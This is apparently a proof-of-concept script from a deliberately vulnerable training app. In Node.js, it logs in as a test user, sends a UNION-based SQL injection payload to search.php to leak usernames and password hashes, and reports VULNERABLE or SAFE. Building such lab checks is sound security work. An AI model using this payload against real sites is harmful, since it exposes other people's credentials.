// PoC 01 - SQL Injection (search.php)
// Usage: node poc.js http://localhost/Obscura/vulnerable/app   (or http://localhost:8081 in Docker)
const http = require('http'), https = require('https'), { URL } = require('url');
const base = (process.argv[2] || '').replace(/\/+$/, '');

function request(urlStr, { method = 'GET', headers = {}, body = null } = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(urlStr);
    const lib = u.protocol === 'https:' ? https : http;
    const req = lib.request(u, { method, headers }, (res) => {
      let data = '';
      res.on('data', (c) => (data += c));
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}
const form = (o) => new URLSearchParams(o).toString();

(async () => {
  const login = await request(`${base}/login.php`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: form({ username: 'maria', password: 'Maria123!' }),
  });
  const sc = login.headers['set-cookie'] || [];
  const cookie = (sc[sc.length - 1] || '').split(';')[0];

  const payload = "') UNION SELECT id, username, password_hash FROM users#";
  const res = await request(`${base}/search.php?q=${encodeURIComponent(payload)}`, { headers: { Cookie: cookie } });

  if (res.body.includes('$2y$') && res.body.includes('admin')) {
    console.log('[+] VULNERABLE: leaked usernames + password hashes via SQL injection');
  } else {
    console.log('[-] SAFE: injection returned no cross-user data');
  }
})();